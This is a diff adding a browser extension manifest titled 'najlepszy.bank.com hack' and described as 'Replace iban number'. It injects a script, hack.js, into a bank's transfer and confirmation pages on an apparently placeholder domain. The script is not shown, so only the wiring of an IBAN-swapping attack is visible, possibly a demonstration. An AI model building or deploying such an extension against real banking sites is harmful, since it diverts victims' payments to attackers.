@@ -1,0 +1,20 @@
+{
+    "manifest_version": 3,
+    "name": "najlepszy.bank.com hack",
+    "description": "Replace iban number",
+    "version": "1.0",
+    "action": {
+      "default_popup": "index.html"
+    },
+    "content_scripts": [
+        {
+          "js": ["scripts/hack.js"],
+          "matches": [
+            "https://thebestbank.ever/transfers/new/",
+            "https://thebestbank.ever/transfers/confirm/*",
+            "http://thebestbank.ever/transfers/new/",
+            "http://thebestbank.ever/transfers/confirm/*"
+          ]
+        }
+      ]
+  }
